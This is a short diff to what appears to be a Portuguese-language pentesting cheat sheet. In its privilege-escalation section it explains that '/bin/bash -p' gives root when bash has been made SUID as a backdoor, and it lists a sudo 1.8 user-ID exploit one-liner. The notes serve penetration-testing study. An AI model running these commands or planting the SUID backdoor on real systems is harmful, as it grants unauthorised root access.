@@ -5531,7 +5531,7 @@ Comandos para dar spawn um bash mais interativo
 
 ## ESCALANDO PRIVILEGIOS PRIVESC
 
-Ao rodar o comando `sudo -l` e identificar que há permisão especial rodar `/bin/bash -p` pra tentar escalar
+Ao rodar o comando `sudo -l` e identificar que há permisão especial rodar `/bin/bash -p` pra tentar escalar, esse comando se dá caso alguém ja tenha executado `sudo chmod +s /bin/bash`, uma espécie de backdoor
 
 Ao identificar que o SUDO é vulnerável `v1.8*` rodar o comando `sudo -u \#$((0xffffffff)) /bin/bash` pra tentar escalar
 
